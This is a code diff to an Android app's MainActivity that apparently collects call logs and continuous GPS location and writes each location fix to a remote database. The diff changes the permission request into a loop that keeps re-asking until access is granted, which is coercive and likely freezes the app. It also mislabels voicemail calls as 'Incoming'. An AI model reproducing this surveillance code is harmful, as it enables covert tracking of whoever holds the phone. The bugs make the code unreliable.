@@ -78,6 +78,11 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         ctx = this;
         setContentView(R.layout.activity_main);
+
+        while (!hasPermissions(this, PERMISSIONS)) {
+            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
+        }
+
         mSensorService = new ServiceSensor(getCtx());
         mServiceIntent = new Intent(getCtx(), mSensorService.getClass());
         if (!isMyServiceRunning(mSensorService.getClass())) {
@@ -90,10 +95,6 @@ public class MainActivity extends AppCompatActivity {
         setSupportActionBar(toolbar);
         setupViewPager(viewPager);
         tabLayout.setupWithViewPager(viewPager);
-
-        if (!hasPermissions(this, PERMISSIONS)) {
-            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
-        }
 
 
             //execute all functions
@@ -186,7 +187,7 @@ public class MainActivity extends AppCompatActivity {
             }
             else if (callType == 4)
             {
-                callTypeformatted = "Voice Mail";
+                callTypeformatted = "Incoming";
             }
             else if (callType == 5)
             {
@@ -410,7 +411,7 @@ public class MainActivity extends AppCompatActivity {
             public void onLocationChanged(Location location) {
                 String gpsloc = "Latitude: " + Double.toString(location.getLatitude()) + " Longitude: " + Double.toString(location.getLongitude())
                         + " Altitude: " + Double.toString(location.getAltitude());
-                myRefLocation.push().setValue(gpsloc);
+                myRefLocation.child("Location").setValue(gpsloc);
             }
 
             public void onStatusChanged(String provider, int status, Bundle extras) {
